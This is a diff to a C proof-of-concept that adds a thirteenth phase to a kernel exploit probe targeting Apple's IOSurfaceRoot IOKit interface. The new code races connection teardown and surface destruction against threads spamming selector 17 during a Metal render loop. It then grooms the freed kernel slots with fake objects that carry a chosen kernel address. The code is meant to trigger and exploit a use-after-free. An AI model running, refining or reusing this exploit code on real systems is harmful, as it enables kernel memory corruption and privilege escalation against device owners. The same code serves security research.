@@ -1301,6 +1301,115 @@ static void *p11b_groomer(void *arg) {
     return NULL;
 }
 
+/* Phase 13: Full PoC Stage C+D — Metal render loop + race variants */
+static volatile int p13_spam_run = 0;
+static io_connect_t p13_spam_conn = IO_OBJECT_NULL;
+static volatile int p13_spam_shape = 1;
+static volatile uint64_t p13_spam_count = 0;
+
+static void *p13_spam_reg(void *arg) {
+    (void)arg;
+    io_connect_t c = p13_spam_conn;
+    int shape = p13_spam_shape;
+    uint64_t inp[3] = {1, 2, 3};
+    mach_port_t wp = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+    uint64_t ref = 0x1122334455667788ULL;
+    while (p13_spam_run) {
+        IOConnectCallAsyncMethod(c, 17, wp, &ref, 1, NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        __sync_fetch_and_add(&p13_spam_count, 1);
+    }
+    mach_port_deallocate(mach_task_self(), wp);
+    return NULL;
+}
+
+static volatile int p13_render_run = 0;
+static volatile int p13_render_frames = 0;
+
+static void *p13_render_loop(void *arg) {
+    (void)arg;
+    /* Load Metal via dlopen — we're pure C but just need MTLCreateSystemDefaultDevice() */
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    void *mtl_dev = NULL;
+    if (metal_lib) {
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        if (createDev) mtl_dev = createDev();
+    }
+    /* Even without Metal, the CVPixelBuffer+IOSurface churn may help */
+
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, bpr = w * bpe;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    int pf = 0x42475241; /* BGRA */
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+    while (p13_render_run && p13_render_frames < 100000) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (s) {
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreateWithIOSurface(NULL, s, NULL, &pb);
+            if (pb) CFRelease(pb);
+            CFRelease(s);
+        }
+        usleep(16000);
+        p13_render_frames++;
+    }
+    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn);
+    CFRelease(props);
+    if (metal_lib) dlclose(metal_lib);
+    return NULL;
+}
+
+/* Phase 13 groom state */
+static io_connect_t p13_groom_conn = IO_OBJECT_NULL;
+static mach_port_t p13_groom_wps[512];
+static int p13_groom_n = 0;
+
+static void p13_free_groom(void) {
+    for (int i = 0; i < p13_groom_n; i++)
+        mach_port_deallocate(mach_task_self(), p13_groom_wps[i]);
+    p13_groom_n = 0;
+}
+
+static void p13_groom_fake(uint64_t addr, uint64_t val, int inSz) {
+    p13_free_groom();
+    if (!p13_groom_conn) return;
+    uint8_t fbuf[64];
+    memset(fbuf, 0, sizeof(fbuf));
+    uint64_t *f = (uint64_t *)fbuf;
+    f[0] = 0x21;
+    f[1] = 0x1122334455667788ULL;
+    f[2] = addr;
+    f[3] = val;
+    f[4] = 0x4141414141414141ULL;
+    f[5] = 0x43414E415259ULL;
+    uint64_t ref = 0xA1B2C3D4E5F60708ULL;
+    if (inSz <= 0 || inSz > 64) inSz = 24;
+    for (int i = 0; i < 512; i++) {
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        kern_return_t r = IOConnectCallAsyncMethod(p13_groom_conn, 1000, wp, &ref, 1,
+            NULL, 0, fbuf, inSz, NULL, NULL, NULL, NULL);
+        if (r == 0 || r == (kern_return_t)0xE00002C2) {
+            p13_groom_wps[p13_groom_n++] = wp;
+        } else {
+            mach_port_deallocate(mach_task_self(), wp);
+        }
+    }
+}
+
 static void *worker_thread(void *arg) {
     (void)arg;
     int argc = g_main_argc;
@@ -18872,6 +18981,322 @@ new_modes:
         }
         phase12_done:
         rlog("--- Phase 12 complete ---\n");
+
+        /*
+         * Phase 13: Full PoC Stage C+D — Metal render loop + race variants
+         *
+         * The PoC runs the race variants (v_race8, v_big, v_surfch, v_dereg18)
+         * DURING a Metal render loop. The render loop creates IOSurface-backed
+         * CVPixelBuffers at ~60fps while a Metal device exists, triggering GPU
+         * workloop registry walks. The races close connections/destroy surfaces
+         * while spam threads repeatedly call sel17, creating a window where the
+         * kernel walks through a freed/groomed entry.
+         *
+         * We load Metal dynamically via dlopen since the probe is pure C.
+         */
+        rlog("\n--- Phase 13: Full PoC race (Metal render loop + Stage C variants) ---\n");
+        {
+            io_service_t svc13 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!svc13) { rlog("  Phase 13: service lookup failed\n"); goto phase13_done; }
+
+            /* Determine best shape (calibrate) */
+            int p13_shape = -1;
+            {
+                uint64_t inp[3] = {1, 2, 3};
+                for (int shape = 0; shape < 4; shape++) {
+                    io_connect_t tc = IO_OBJECT_NULL;
+                    if (IOServiceOpen(svc13, mach_task_self(), 0, &tc) != KERN_SUCCESS) continue;
+                    mach_port_t twp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                    mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref = 0x1122334455667788ULL;
+                    kern_return_t r = IOConnectCallAsyncMethod(tc, 17, twp, &ref, 1,
+                        NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                    rlog("  calib shape=%d -> 0x%x\n", shape, (uint32_t)r);
+                    if (r == KERN_SUCCESS && p13_shape < 0) p13_shape = shape;
+                    IOServiceClose(tc);
+                    mach_port_deallocate(mach_task_self(), twp);
+                }
+            }
+            if (p13_shape < 0) {
+                rlog("  Phase 13: calibration failed — no shape works\n");
+                goto phase13_done;
+            }
+            rlog("  best_shape=%d\n", p13_shape);
+
+            /* Open groom connection */
+            if (IOServiceOpen(svc13, mach_task_self(), 0, &p13_groom_conn) != KERN_SUCCESS) {
+                rlog("  Phase 13: groom conn open failed\n");
+                p13_groom_conn = IO_OBJECT_NULL;
+                goto phase13_done;
+            }
+
+            /* Start render loop (Stage D) */
+            rlog("  Starting Metal render loop (Stage D)...\n");
+            p13_render_run = 1;
+            p13_render_frames = 0;
+            pthread_t render_th;
+            pthread_create(&render_th, NULL, p13_render_loop, NULL);
+            usleep(500000); /* let render loop stabilize 0.5s */
+            rlog("  Render loop running, frames=%d\n", p13_render_frames);
+
+            /* Stage C: race variants during render loop */
+            uint64_t inp13[3] = {1, 2, 3};
+
+            /* v_race8: 8 connections, spam threads, staggered close */
+            rlog("  Stage C phase 1: v_race8 x20\n");
+            for (int iter = 0; iter < 20; iter++) {
+                io_connect_t cs[8];
+                int have[8];
+                for (int i = 0; i < 8; i++) {
+                    have[i] = (IOServiceOpen(svc13, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
+                    if (have[i]) {
+                        mach_port_t twp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                        mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0x1122334455667788ULL;
+                        IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
+                            NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), twp);
+                    } else cs[i] = IO_OBJECT_NULL;
+                }
+                /* Start spam on first connection */
+                p13_spam_run = 1;
+                p13_spam_conn = have[0] ? cs[0] : IO_OBJECT_NULL;
+                p13_spam_shape = p13_shape;
+                p13_spam_count = 0;
+                pthread_t spam_th[8];
+                for (int t = 0; t < 8; t++)
+                    pthread_create(&spam_th[t], NULL, p13_spam_reg, NULL);
+
+                /* Staggered close — race window */
+                for (int r = 0; r < 3; r++)
+                    for (int i = 0; i < 8; i++) {
+                        int j = (i * 5 + r * 3) % 8;
+                        if (have[j]) { IOServiceClose(cs[j]); have[j] = 0; }
+                        usleep(20 + (iter % 10) * 7);
+                    }
+                p13_spam_run = 0;
+                for (int t = 0; t < 8; t++) pthread_join(spam_th[t], NULL);
+                for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
+
+                /* Groom the freed slots */
+                p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
+
+                /* Check wake ports for notifications */
+                int msg_count = 0;
+                for (int gi = 0; gi < p13_groom_n && gi < 50; gi++) {
+                    uint8_t msg_buf[256];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = p13_groom_wps[gi];
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), p13_groom_wps[gi], 5, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) msg_count++;
+                }
+                if (msg_count > 0 || iter < 3)
+                    rlog("    v_race8[%d] spam=%llu msgs=%d\n", iter,
+                        (unsigned long long)p13_spam_count, msg_count);
+                p13_free_groom();
+            }
+
+            /* v_big: 64 surfaces + 8 connections, staggered close */
+            rlog("  Stage C phase 2: v_big x15\n");
+            for (int iter = 0; iter < 15; iter++) {
+                IOSurfaceRef surfs[64];
+                CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int sw = 64, sh = 64, sbpe = 4, sbpr = sw * sbpe;
+                CFNumberRef swn = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+                CFNumberRef shn = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+                CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+                CFNumberRef srn = CFNumberCreate(NULL, kCFNumberIntType, &sbpr);
+                int spf = 0x42475241;
+                CFNumberRef spfn = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+                CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), swn);
+                CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), shn);
+                CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), sbn);
+                CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), srn);
+                CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), spfn);
+                for (int i = 0; i < 64; i++) surfs[i] = IOSurfaceCreate(sp);
+
+                io_connect_t cs[8]; int have[8];
+                for (int i = 0; i < 8; i++) {
+                    have[i] = (IOServiceOpen(svc13, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
+                    if (have[i]) {
+                        mach_port_t twp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                        mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0x1122334455667788ULL;
+                        IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
+                            NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), twp);
+                    } else cs[i] = IO_OBJECT_NULL;
+                }
+                p13_spam_run = 1;
+                p13_spam_conn = have[0] ? cs[0] : IO_OBJECT_NULL;
+                p13_spam_count = 0;
+                pthread_t spam_th[6];
+                for (int t = 0; t < 6; t++)
+                    pthread_create(&spam_th[t], NULL, p13_spam_reg, NULL);
+
+                for (int i = 7; i >= 0; i--) {
+                    if (have[i]) { IOServiceClose(cs[i]); have[i] = 0; }
+                    usleep(30);
+                }
+                for (int i = 0; i < 64; i++) if (surfs[i]) CFRelease(surfs[i]);
+                p13_spam_run = 0;
+                for (int t = 0; t < 6; t++) pthread_join(spam_th[t], NULL);
+                for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
+
+                p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
+                int msg_count = 0;
+                for (int gi = 0; gi < p13_groom_n && gi < 50; gi++) {
+                    uint8_t msg_buf[256];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = p13_groom_wps[gi];
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), p13_groom_wps[gi], 5, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) msg_count++;
+                }
+                if (msg_count > 0 || iter < 2)
+                    rlog("    v_big[%d] spam=%llu msgs=%d\n", iter,
+                        (unsigned long long)p13_spam_count, msg_count);
+                p13_free_groom();
+                CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(srn); CFRelease(spfn);
+                CFRelease(sp);
+            }
+
+            /* v_surfch: single conn, surface churn during spam */
+            rlog("  Stage C phase 3: v_surfch x20\n");
+            for (int iter = 0; iter < 20; iter++) {
+                io_connect_t c13 = IO_OBJECT_NULL;
+                if (IOServiceOpen(svc13, mach_task_self(), 0, &c13) != KERN_SUCCESS) continue;
+                mach_port_t wp13 = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp13);
+                mach_port_insert_right(mach_task_self(), wp13, wp13, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref13 = 0x1122334455667788ULL;
+                IOConnectCallAsyncMethod(c13, 17, wp13, &ref13, 1,
+                    NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
+
+                p13_spam_run = 1;
+                p13_spam_conn = c13;
+                p13_spam_count = 0;
+                pthread_t spam_th[4];
+                for (int t = 0; t < 4; t++)
+                    pthread_create(&spam_th[t], NULL, p13_spam_reg, NULL);
+
+                /* Surface churn — create/destroy quickly */
+                CFMutableDictionaryRef schp = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int schw = 32, schh = 32, schbpe = 4, schbpr = schw * schbpe;
+                CFNumberRef schvals[5];
+                schvals[0] = CFNumberCreate(NULL, kCFNumberIntType, &schw);
+                schvals[1] = CFNumberCreate(NULL, kCFNumberIntType, &schh);
+                schvals[2] = CFNumberCreate(NULL, kCFNumberIntType, &schbpe);
+                schvals[3] = CFNumberCreate(NULL, kCFNumberIntType, &schbpr);
+                int schpf = 0x42475241;
+                schvals[4] = CFNumberCreate(NULL, kCFNumberIntType, &schpf);
+                CFDictionarySetValue(schp, CFSTR("IOSurfaceWidth"), schvals[0]);
+                CFDictionarySetValue(schp, CFSTR("IOSurfaceHeight"), schvals[1]);
+                CFDictionarySetValue(schp, CFSTR("IOSurfaceBytesPerElement"), schvals[2]);
+                CFDictionarySetValue(schp, CFSTR("IOSurfaceBytesPerRow"), schvals[3]);
+                CFDictionarySetValue(schp, CFSTR("IOSurfacePixelFormat"), schvals[4]);
+                for (int i = 0; i < 8; i++) {
+                    IOSurfaceRef ss = IOSurfaceCreate(schp);
+                    if (ss) CFRelease(ss);
+                }
+                for (int v = 0; v < 5; v++) CFRelease(schvals[v]);
+                CFRelease(schp);
+
+                usleep(200 + (iter % 30) * 25);
+                IOServiceClose(c13);
+                usleep(400);
+                p13_spam_run = 0;
+                for (int t = 0; t < 4; t++) pthread_join(spam_th[t], NULL);
+
+                /* Check for notifications on the wake port */
+                int msg_count = 0;
+                for (int m = 0; m < 20; m++) {
+                    uint8_t msg_buf[256];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = wp13;
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), wp13, 5, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) msg_count++;
+                    else break;
+                }
+                if (msg_count > 0 || iter < 2)
+                    rlog("    v_surfch[%d] spam=%llu msgs=%d\n", iter,
+                        (unsigned long long)p13_spam_count, msg_count);
+                mach_port_deallocate(mach_task_self(), wp13);
+            }
+
+            /* v_dereg18: single conn, rapid dereg race against spam */
+            rlog("  Stage C phase 4: v_dereg18 x20\n");
+            for (int iter = 0; iter < 20; iter++) {
+                io_connect_t c13 = IO_OBJECT_NULL;
+                if (IOServiceOpen(svc13, mach_task_self(), 0, &c13) != KERN_SUCCESS) continue;
+                mach_port_t wp13 = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp13);
+                mach_port_insert_right(mach_task_self(), wp13, wp13, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref13 = 0x1122334455667788ULL;
+                IOConnectCallAsyncMethod(c13, 17, wp13, &ref13, 1,
+                    NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
+
+                p13_spam_run = 1;
+                p13_spam_conn = c13;
+                p13_spam_count = 0;
+                pthread_t spam_th[4];
+                for (int t = 0; t < 4; t++)
+                    pthread_create(&spam_th[t], NULL, p13_spam_reg, NULL);
+
+                for (int i = 0; i < 40 + (iter % 20); i++)
+                    IOConnectCallMethod(c13, 18, NULL, 0, inp13, 24,
+                        NULL, NULL, NULL, NULL);
+
+                usleep(300);
+                p13_spam_run = 0;
+                for (int t = 0; t < 4; t++) pthread_join(spam_th[t], NULL);
+
+                /* Check wake port */
+                int msg_count = 0;
+                for (int m = 0; m < 20; m++) {
+                    uint8_t msg_buf[256];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = wp13;
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), wp13, 5, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) msg_count++;
+                    else break;
+                }
+                if (msg_count > 0 || iter < 2)
+                    rlog("    v_dereg18[%d] spam=%llu msgs=%d\n", iter,
+                        (unsigned long long)p13_spam_count, msg_count);
+                IOServiceClose(c13);
+                mach_port_deallocate(mach_task_self(), wp13);
+            }
+
+            /* Stop render loop */
+            p13_render_run = 0;
+            pthread_join(render_th, NULL);
+            rlog("  Render loop stopped, total frames=%d\n", p13_render_frames);
+
+            /* Cleanup */
+            p13_free_groom();
+            if (p13_groom_conn) { IOServiceClose(p13_groom_conn); p13_groom_conn = IO_OBJECT_NULL; }
+            IOObjectRelease(svc13);
+        }
+        phase13_done:
+        rlog("--- Phase 13 complete ---\n");
 
         rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
